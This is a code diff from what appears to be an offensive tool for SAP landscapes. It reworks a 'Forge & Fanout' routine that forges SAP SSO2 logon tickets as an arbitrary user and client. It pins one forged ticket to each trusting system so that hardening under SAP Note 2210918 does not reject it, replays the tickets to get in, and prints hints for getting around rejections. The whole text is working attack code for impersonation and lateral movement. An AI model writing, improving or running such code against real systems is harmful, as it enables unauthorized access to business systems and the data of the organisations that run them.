@@ -6619,53 +6619,98 @@ def create_app(api: SAPMAPApi) -> Bottle:
         def _run():
             from sapmap_exploit import extract_and_forge_ticket
             from sap_ticket_propagate import (
-                propagate_to_trusted_subgraph)
+                propagate_via_forged_ticket)
 
-            print(f"[*] {sid}: Forge & Fanout — forging ticket as "
-                  f"{user}/{client}...")
-            r = extract_and_forge_ticket(
-                node=node, state=api.state,
-                user=user, client=client,
-                validity_min=validity_min, digest=digest,
-                recipient_sid=recipient_sid,
-                recipient_client=recipient_client,
-            )
-            if not r.get("success"):
-                print(f"[-] {sid}: forgery failed: {r.get('error')}")
-                return
-            ticket = r["ticket"]
-
-            # Derive fanout targets from state.trust_relations
-            fanout_sids = []
+            # Derive fanout targets from state.trust_relations FIRST
+            # so we can forge per-target pinned tickets.
+            fanout_targets = []  # list of (target_sid, target_client)
+            seen_targets = set()
             for rel in api.state.trust_relations:
                 if rel.issuer_sid != sid:
                     continue
                 if rel.trusting_sid == sid:
                     continue
-                if rel.trusting_sid not in fanout_sids:
-                    fanout_sids.append(rel.trusting_sid)
-            if not fanout_sids:
+                # Skip if target SID not on the map (we need a node
+                # to replay against)
+                if rel.trusting_sid not in api.state.nodes:
+                    continue
+                tgt_client = (rel.trusting_client
+                              or recipient_client or client or "100")
+                key = (rel.trusting_sid, tgt_client)
+                if key in seen_targets:
+                    continue
+                seen_targets.add(key)
+                fanout_targets.append((rel.trusting_sid, tgt_client))
+
+            if not fanout_targets:
                 print(f"[*] {sid}: no STRUSTSSO2-trusted receivers "
-                      f"known; run 'Discover STRUSTSSO2 trust' on "
-                      f"candidate systems first")
+                      f"known (or no map nodes for them); run "
+                      f"'Discover STRUSTSSO2 trust' first")
                 return
 
-            print(f"[*] {sid}: fanning out forged ticket to "
-                  f"{len(fanout_sids)} STRUSTSSO2-trusted receivers: "
-                  f"{', '.join(fanout_sids)}")
-            prop = propagate_to_trusted_subgraph(
-                ticket=ticket, state=api.state,
-                candidate_sids=fanout_sids,
-                channels=channels, timeout=timeout)
+            print(f"[*] {sid}: Forge & Fanout — {len(fanout_targets)} "
+                  f"target(s): "
+                  f"{', '.join(f'{t}/{c}' for t, c in fanout_targets)}")
+            print(f"[*] {sid}: forging a SEPARATE pinned ticket per "
+                  f"target (modern kernels reject unpinned tickets "
+                  f"under SAP Note 2210918 hardening)")
+
+            succeeded = 0
+            tried = 0
+            for target_sid, target_client in fanout_targets:
+                tried += 1
+                target_node = api.state.nodes.get(target_sid)
+                if not target_node:
+                    print(f"[-] {target_sid}: target not on the map — "
+                          f"skipping")
+                    continue
+
+                print(f"[*] {sid}: forging ticket {user}/{client} "
+                      f"pinned for {target_sid}/{target_client}...")
+                r = extract_and_forge_ticket(
+                    node=node, state=api.state,
+                    user=user, client=client,
+                    validity_min=validity_min, digest=digest,
+                    recipient_sid=target_sid,
+                    recipient_client=target_client,
+                )
+                if not r.get("success"):
+                    print(f"[-] {sid}: forgery failed: "
+                          f"{r.get('error')}")
+                    continue
+                ticket = r["ticket"]
+
+                # Replay against this specific target
+                print(f"[*] {target_sid}: replaying ticket via "
+                      f"{', '.join(channels)}")
+                prop = propagate_via_forged_ticket(
+                    ticket=ticket, target_node=target_node,
+                    state=api.state, channels=channels,
+                    timeout=timeout)
+                mark = "✓" if prop["success"] else "✗"
+                ev = (prop.get("evidence")
+                      or prop.get("error", ""))[:200]
+                ch = prop.get("channel", "—")
+                print(f"      [{mark}] {target_sid:6s} {ch:6s} {ev}")
+                if prop["success"]:
+                    succeeded += 1
+                else:
+                    # Diagnostic hints for common rejection modes
+                    err_lower = ev.lower()
+                    if "401" in ev or "unauthorized" in err_lower:
+                        print(f"            hint: target may have "
+                              f"login/accept_sso2_ticket=0, OR our "
+                              f"PSE cert isn't registered in target's "
+                              f"STRUSTSSO2 (check STRUST on "
+                              f"{target_sid})")
+                    elif "403" in ev or "forbidden" in err_lower:
+                        print(f"            hint: user '{user}' may "
+                              f"be locked or missing on "
+                              f"{target_sid}/{target_client}, or the "
+                              f"target requires HTTPS only")
+
             print(f"[+] {sid}: fanout complete — "
-                  f"{prop['succeeded']}/{prop['tried']} receivers "
-                  f"accepted the ticket")
-            for entry in prop["results"]:
-                mark = "✓" if entry["success"] else "✗"
-                ev = (entry.get("evidence")
-                      or entry.get("error", ""))[:100]
-                print(f"      [{mark}] {entry['sid']:6s} "
-                      f"{entry.get('channel', '—'):6s} {ev}")
+                  f"{succeeded}/{tried} targets accepted the ticket")
 
         _bg(f"{sid}:forge_and_fanout", "Forge & Fanout Ticket", _run)
         return json.dumps({"status": "started"})
